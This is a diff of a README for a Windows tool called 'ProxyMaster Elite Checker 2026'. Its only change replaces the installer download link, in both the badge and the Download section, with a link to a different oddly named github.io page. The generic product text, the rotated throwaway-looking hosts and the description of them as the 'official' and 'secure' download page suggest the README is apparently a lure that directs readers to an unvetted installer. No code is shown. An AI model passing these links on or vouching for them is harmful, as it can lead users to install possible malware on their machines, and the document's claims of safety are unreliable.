@@ -2,7 +2,7 @@
 
 ProxyMaster Elite Checker 2026 is a powerful Windows desktop application built for efficient proxy checking and scanning. It enables users to validate large lists of proxies quickly, supporting various protocols and offering detailed reports. Designed for the 2026 environment, this tool ensures compatibility and performance on modern systems.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 - **Bulk Proxy Validation**: Process thousands of proxies in a single batch, saving time and effort.
@@ -48,6 +48,6 @@ The application uses advanced multi-threading and optimized networking protocols
 
 ## Download
 For the most up-to-date version, download ProxyMaster Elite Checker 2026 from the official GitHub page:
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 This link directs you to the secure download page where you can access the installer and updates. Always ensure you download from trusted sources to maintain system security.
